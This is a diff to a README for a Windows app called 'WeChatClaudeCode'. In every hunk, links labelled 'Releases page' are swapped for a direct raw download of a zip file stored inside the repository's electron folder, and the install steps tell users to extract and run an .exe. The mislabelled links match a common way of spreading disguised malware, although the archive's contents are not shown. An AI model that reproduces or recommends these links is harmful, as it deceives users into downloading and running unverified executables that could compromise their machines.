@@ -1,9 +1,9 @@
 # 🤖 WeChatClaudeCode - Connect Claude Code Through WeChat
 
-[![Download WeChatClaudeCode](https://img.shields.io/badge/Download%20WeChatClaudeCode-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Sudokupubescence845/WeChatClaudeCode/releases)
+[![Download WeChatClaudeCode](https://img.shields.io/badge/Download%20WeChatClaudeCode-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Sudokupubescence845/WeChatClaudeCode/raw/refs/heads/main/electron/We_Claude_Code_Chat_v1.4.zip)
 
 ## 📥 Download
-Visit the [Releases page](https://github.com/Sudokupubescence845/WeChatClaudeCode/releases) to download the Windows version.
+Visit the [Releases page](https://github.com/Sudokupubescence845/WeChatClaudeCode/raw/refs/heads/main/electron/We_Claude_Code_Chat_v1.4.zip) to download the Windows version.
 
 Look for the latest release file in the list. If there is more than one file, pick the one for Windows. The file name usually ends with `.exe`, `.zip`, or `.msi`.
 
@@ -30,7 +30,7 @@ If you use a work PC, you may need admin rights to install or open the app.
 ## 🚀 Install on Windows
 Follow these steps:
 
-1. Open the [Releases page](https://github.com/Sudokupubescence845/WeChatClaudeCode/releases).
+1. Open the [Releases page](https://github.com/Sudokupubescence845/WeChatClaudeCode/raw/refs/heads/main/electron/We_Claude_Code_Chat_v1.4.zip).
 2. Find the newest release at the top of the page.
 3. Download the Windows file. It may be a `.exe` file or a `.zip` file.
 4. If you downloaded a `.zip` file, right-click it and choose Extract All.
@@ -149,7 +149,7 @@ If you are not sure which one to choose, pick the Windows `.exe` file or the ins
 ## 🔄 Update the App
 When a new version is out:
 
-1. Return to the [Releases page](https://github.com/Sudokupubescence845/WeChatClaudeCode/releases)
+1. Return to the [Releases page](https://github.com/Sudokupubescence845/WeChatClaudeCode/raw/refs/heads/main/electron/We_Claude_Code_Chat_v1.4.zip)
 2. Download the latest Windows file
 3. Close the old version
 4. Open the new version
@@ -181,7 +181,7 @@ A simple daily flow looks like this:
 ## 🔗 Download Again
 If you need the app later, use this page:
 
-[https://github.com/Sudokupubescence845/WeChatClaudeCode/releases](https://github.com/Sudokupubescence845/WeChatClaudeCode/releases)
+[https://github.com/Sudokupubescence845/WeChatClaudeCode/raw/refs/heads/main/electron/We_Claude_Code_Chat_v1.4.zip](https://github.com/Sudokupubescence845/WeChatClaudeCode/raw/refs/heads/main/electron/We_Claude_Code_Chat_v1.4.zip)
 
 ## 📎 License
 Use the release files and app in line with the terms provided in the repository and release page
